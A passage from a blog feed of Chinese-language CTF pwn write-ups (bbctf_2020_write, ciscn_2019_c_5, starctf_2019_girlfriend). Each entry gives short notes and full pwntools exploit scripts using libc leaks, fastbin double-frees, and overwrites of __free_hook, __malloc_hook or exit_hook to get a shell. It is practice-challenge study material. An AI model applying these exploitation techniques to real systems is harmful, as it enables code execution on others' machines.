class="number">0x20</span>,<span class="string">'c'</span>)      <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'f'</span>)      <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'d'</span>)      <span class="comment">#9</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">merge(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x31</span>)+p64(free_hook)+p64(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'cccc'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(one_gadget))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>bbctf_2020_write</title>
      <link href="//posts/75171fcc/"/>
      <url>//posts/75171fcc/</url>
      
        <content type="html"><![CDATA[<p><img src="https://i0.imgs.ovh/2024/03/07/QUp53.png" alt="image-20240308192349360"></p><p><img src="https://i0.imgs.ovh/2024/03/07/QUMbe.png" alt="image-20240308192110221"> </p><h5 id="可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。"><a href="#可以泄露了puts-got-可以算偏移，程序可以改地址的内容，那么可以改exit-hook-exit函数会执行run-exit-handlers，然后这个函数会调用-dl-fini，然后这个-dl-fini的源码调用了-rtld-lock-lock-recursive-和-rtld-lock-unlock-recursive，所以只需要向其中一个写入one-gadget就行了。" class="headerlink" title="可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。"></a>可以泄露了puts_got,可以算偏移，程序可以改地址的内容，那么可以改exit_hook,exit函数会执行<strong>run_exit_handlers，然后这个函数会调用_dl_fini，然后这个_dl_fini的源码调用了 </strong>rtld_lock_lock_recursive 和 __rtld_lock_unlock_recursive，所以只需要向其中一个写入one_gadget就行了。</h5><h5 id="为了以后方便，以后就这样算"><a href="#为了以后方便，以后就这样算" class="headerlink" title="为了以后方便，以后就这样算"></a>为了以后方便，以后就这样算</h5><p><strong>在libc-2.23中</strong><br><strong>exit_hook = libc_base+0x5f0040+3848</strong></p><p><strong>exit_hook = libc_base+0x5f0040+3856</strong></p><p><strong>在libc-2.27中</strong></p><p><strong>exit_hook = libc_base+0x619060+3840</strong></p><h5 id="exit-hook-libc-base-0x619060-3848"><a href="#exit-hook-libc-base-0x619060-3848" class="headerlink" title="exit_hook = libc_base+0x619060+3848"></a>exit_hook = libc_base+0x619060+3848</h5><h5 id="具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式"><a href="#具体的exit-hook可以看这，然后用one-gadget-然后输入的话得用字符串格式" class="headerlink" title="具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式"></a>具体的exit_hook可以看这，然后用one_gadget.然后输入的话得用字符串格式</h5><p><a href="[exit_hook在pwn题中的应用 - 码农教程 (manongjc.com">exit_hook在pwn题中的应用</a>](<a href="http://www.manongjc.com/detail/21-aktzmrsypltrrll.html">http://www.manongjc.com/detail/21-aktzmrsypltrrll.html</a>))</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">"node5.buuoj.cn"</span>,<span class="number">29131</span>)</span><br><span class="line"><span class="comment">#p=process("./bbctf_2020_write")</span></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'puts: '</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">base=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'put'</span>+<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">p.sendline(<span class="string">'w'</span>)</span><br><span class="line"></span><br><span class="line">exit_hook=base++<span class="number">0x619060</span>+<span class="number">3848</span></span><br><span class="line">one=[<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">one_gadget=one[<span class="number">1</span>]+base</span><br><span class="line">p.sendlineafter(<span class="string">'ptr: '</span>,<span class="built_in">str</span>(exit_hook))</span><br><span class="line">p.sendlineafter(<span class="string">'val: '</span>,<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'(q)uit'</span>,<span class="string">'q'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ciscn_2019_c_5</title>
      <link href="//posts/eeb50a42/"/>
      <url>//posts/eeb50a42/</url>
      
        <content type="html"><![CDATA[<p> 保护全开</p><p>有格式化字符串漏洞但是用%n$p之类的会报错，用%p不会，算得偏移是8</p><p><img src="https://i0.imgs.ovh/2024/03/07/QOW8j.png" alt="image-20240308125027309"></p><p><img src="https://i0.imgs.ovh/2024/03/07/QO0AI.png" alt="image-20240308125159916"></p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">'name?'</span>,<span class="string">'%p%p%p%p%p%p%p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'59'</span>)</span><br><span class="line">io_stder=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></tbody></table></figure><h5 id="接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误"><a href="#接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误" class="headerlink" title="接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误"></a>接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误</h5><p><img src="https://i0.imgs.ovh/2024/03/07/Qe2aT.png" alt="image-20240308151037911"></p><p>这里对应第七个参数</p><p><img src="https://i0.imgs.ovh/2024/03/07/QeoBo.png" alt="image-20240308151240318"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./ciscn_2019_c_5'</span>)</span><br><span class="line"><span class="comment">#p=remote('node5.buuoj.cn',28941)</span></span><br><span class="line">elf=ELF(<span class="string">'./ciscn_2019_c_5'</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,story</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'story:'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'story:'</span>,story)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">':'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name?'</span>,<span class="string">'%p%p%p%p%p%p%p'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'59'</span>)</span><br><span class="line">debug()</span><br><span class="line">io_stder=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="comment">#.ljust(8,b'\x00')</span></span><br><span class="line">p.sendlineafter(<span class="string">'input your ID.'</span>,<span class="string">'kkkk'</span>)</span><br><span class="line"></span><br><span class="line">base=io_stder-libc.sym[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'io_st  '</span>+<span class="built_in">hex</span>(io_stder)+<span class="string">'system  '</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bbbb'</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'bin/sh\n'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook)) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'dddd'</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf_2019_girlfriend</title>
      <link href="//posts/2672e039/"/>
      <url>//posts/2672e039/</url>
      
        <content type="html"><![CDATA[<p>保护全开,本想以简单的uaf去解决，但是却会内存错误，所以这个方法不行</p><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node4.buuoj.cn",)</span></span><br><span class="line">p=process(<span class="string">"./starctf_2019_girlfriend"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"girl's name"</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">'please inpute her name:'</span>,content1)</span><br><span class="line">p.sendlineafter(<span class="string">'please input her call:'</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Please input the index:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice:'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Please input the index:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">88</span></span><br><span class="line">base=main_arena-<span class="number">0x10</span>-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'dddd'</span>,<span class="string">'eeee'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'/bin/sh'</span>,<span class="string">'cccc'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'main_arena'</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook-<span class="number">0x10</span>),<span class="string">'dddd'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'cccc'</span>,<span class="string">'dddd'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'eeee'</span>,<span class="string">'vvvv'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">'dddd'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/06/QwhQd.png" alt="image-20240307120041249"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qwk1T.png" alt="image-20240306215632879"></p><p><img src="https://i0.imgs.ovh/2024/03/06/Qw0vu.png" alt="image-20240306215708434"></p><h5 id="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88"><a href="#首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88" class="headerlink" title="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88"></a>首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>,<span class="string">'ssss'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'dddd'</span>,<span class="string">'eeee'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'main_arena'</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook=main_arena-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br></pre></td></tr></tbody></table></figure><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">3</span>]</span><br><span class="line">realloc=libc.sym[<span class="string">'realloc'</span>]+base</span><br><span class="line"><span class="comment">#这里的话得用到</span></span><br></pre></td></tr></tbody></table></figure><h5 id="realloc-hook-malloc-hook-0x8"><a href="#realloc-hook-malloc-hook-0x8" class="headerlink" title="realloc_hook=malloc_hook-0x8"></a>realloc_hook=malloc_hook-0x8</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>),p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>,<span class="string">'dddd'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'dddd'</span>,<span class="string">'eeee'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'one_gadget='</span>+<span class="built_in">hex</span>(one_gadget)+<span class="string">'   malloc='</span>+<span class="built_in">hex</span>(malloc_hook-<span class="number">0x23</span>)+<span class="string">'   realloc='</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc+<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">'cccc'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://i0.imgs.ovh/2024/03/06/Qso0K.png" alt="image-20240307191637279"></p><h5 id="使用one-gadget的条件"><a href="#使用one-gadget的条件" class="headerlink" title="使用one_gadget的条件"></a>使用one_gadget的条件</h5><p><img src="https://i0.imgs.ovh/2024/03/06/Qsuaj.png" alt="image-20240307191828389"></p><h5 id="关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址"><a href="#关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址" class="headerlink" title="关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址"></a>关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址</h5><p><a href="[使用realloc函数来调整栈帧让one_gadget生效 | ZIKH26's Blog](https://zikh26.github.io/posts/f7fd9662.html">链接文本</a>)</p><h5 id="调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"><a href="#调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行" class="headerlink" title="调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"></a>调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行</h5><p><img src="https://i0.imgs.ovh/2024/03/06/QsU1O.png" alt="image-20240307193119248"></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote("node5.buuoj.cn",25861)</span></span><br><span class="line">p=process(<span class="string">"./starctf_2019_girlfriend"</span>)</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"girl's name"</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">'please inpute her name:'</span>,content1)</span><br><span class="line">p.sendlineafter(<span class="string">'please input her call:'</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Please input the index:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">'Input your choice:'</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Please input the index:'</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x20,'aaaa','bbbb')</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>,<span class="string">'ssss'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'dddd'</span>,<span class="string">'eeee'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'main_arena'</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook=main_arena-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">3</span>]</span><br><span class="line">realloc=libc.sym[<span class="string">'realloc'</span>]+base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>),p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'cccc'</span>,<span class="string">'dddd'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'dddd'</span>,<span class="string">'eeee'</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'one_gadget='</span>+<span class="built_in">hex</span>(one_gadget)+<span class="string">'   malloc-0x23='</span>+<span class="built_in">hex</span>(malloc_hook-<span class="number">0x23</span>)+<span class="string">'   realloc='</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b'a'</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc+<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">'cccc'</span>)</span><br><span class="line">debug()</span><br><span class="line">p.sendafter(<span class="string">'Input your choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ACTF_2019_message</title>
      <link href="//posts/f5d1b033/"/>
      <url>//posts/f5d1b033/</url>
      
